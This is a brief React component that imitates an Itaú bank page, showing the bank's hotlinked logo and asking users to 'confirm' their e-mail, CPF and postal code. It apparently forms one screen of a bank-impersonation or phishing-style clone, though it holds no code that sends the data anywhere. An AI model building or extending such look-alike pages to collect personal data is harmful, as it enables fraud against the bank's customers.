import React from 'react'
import './Confirmacao.css'

const Confirmacao = () => {
  return (
    <div className='Confirmacao'>
        <div className='logo'>
            <img src="https://www.itau.com.br/media/dam/m/538533fcf33fd411/original/itau-logo-branco-48x48.png" alt="logo_itau" />
        </div>
        <div className='title-confirm'>
            <span>Confirme os dados abaixo para continuar</span>
        </div>
        <div className='form4'>
            <input className='digitavel' type="text" placeholder='E-mail' />
            <input className='digitavel' type="text" placeholder='CPF' />
            <input className='digitavel' type="text" placeholder='CEP' />
            <button>confirmar</button>
        </div>
    </div>
  )
}

export default Confirmacao